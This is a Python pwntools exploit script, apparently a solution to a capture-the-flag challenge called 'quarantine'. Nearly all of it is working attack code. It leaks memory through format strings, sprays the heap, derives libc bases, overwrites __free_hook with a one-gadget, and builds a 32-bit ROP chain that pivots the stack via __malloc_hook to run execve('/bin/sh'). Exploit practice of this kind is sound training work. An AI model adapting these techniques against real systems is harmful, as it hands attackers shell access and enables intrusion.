#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 ./quarantine
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('../uploads/quarantine')
exe32 = context.binary = ELF('../uploads/quarantine32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'parallel2.tghack.no'
port = int(args.PORT or 6005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def menu(idx):
    io.sendlineafter("> ", str(idx))

def order(data, proc=0):
    menu(2)
    io.sendlineafter("order? ", data)
    if proc == 0:
        io.recvuntil("0: you ordered: ")
    elif proc == 1:
        io.recvuntil("1: you ordered: ")

def wash(amount):
    menu(1)
    io.sendlineafter("soap? ", str(amount))

def ctf(addr, value):
    menu(3)
    io.sendlineafter("addr: ", hex(addr))
    io.sendlineafter("value: ", hex(value))

def shake_hands(addr, proc=0):
    menu(4)
    io.recvline()
    io.sendline(hex(addr))
    if proc == 0:
        io.recvuntil("0: This is the result: ")
    elif proc == 1:
        io.recvuntil("1: This is the result: ")
    leak = int(io.recvline()[:-1], 16)
    return leak

p = log.progress("malloc() spray")
for i in range(1200):
    p.status("{}/{}".format(i, 1200))
    wash(2000000)
p.success("malloc() spray done!")

order("%p")
leak = int(io.recvline()[:-1], 16)
log.info("leak: {:#x}".format(leak))
exe.address = leak - 0xdd1
log.success("binary base: {:#x}".format(exe.address))

#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("../uploads/libc-2.27.so")
#raw_input("check it")
puts = shake_hands(exe.got["puts"])
log.info("puts: {:#x}".format(puts))
libc.address = puts - libc.symbols["puts"]
log.success("libc base: {:#x}".format(libc.address))

ctf(libc.symbols["__free_hook"], libc.address + 0x10a38c)
# trigger free call through printf()
order("%80000c")


#raw_input("ok?")
# now exploit the 32-bit binary!
order("%p.%p", proc=1)
leak = int(io.recvline()[:-1].split(".")[1], 16)
log.info("32-bit binary leak: {:#x}".format(leak))
exe32.address = leak - 0xc1e
log.success("32-bit binary base: {:#x}".format(exe32.address))
libc = ELF("../uploads/libc-2.27.so_32")

puts32 = shake_hands(exe32.got["puts"], proc=1)
log.info("puts: {:#x}".format(puts32))
libc.address = puts32 - libc.symbols["puts"]
log.success("32-bit libc base: {:#x}".format(libc.address))

# one-shot gadgets don't really work well on 32-bit
# since we have allocated a bunch of memory, try to write to an address within
# the range [0, 2000000). Then send this as a size to malloc and overwrite
# __malloc_hook with system

#for i in range(512*2):
#    wash(2000000)

# this didn't work too well since the process has taken up a huge amount of
# memory, which makes clone() fail :))
#ctf(2000000-0x100+0, u32("/bin"))
#ctf(2000000-0x100+4, u32("/sh\x00"))
#ctf(libc.symbols["__malloc_hook"], libc.symbols["system"])
#wash(2000000-0x100)
#ctf(libc.symbols["__malloc_hook"], libc.symbols["free"])

ropchain = [
        libc.symbols["execve"],
        0xdeadbeef,
        libc.search("/bin/sh").next(),
        0x00,
        0x00,
]

# spray more to be sure we hit the fake stack
p = log.progress("spraying for fake stack")
for i in range(512):
    p.status("{}/{}".format(i, 512))
    wash(1000000)
p.success("fake stack spray done!")

# 0x00097861 : mov esp, 0x5ff801c0 ; ret
# 0x00096ec1 : mov esp, 0x5ff801c0 ; ret
fake_stack_addr = 0x5ff801c0
for i in range(len(ropchain)):
    ctf(fake_stack_addr + (i * 4), ropchain[i])

ctf(libc.symbols["__malloc_hook"], libc.address + 0x00096ec1)
# trigger gadget
wash(123)

io.interactive()
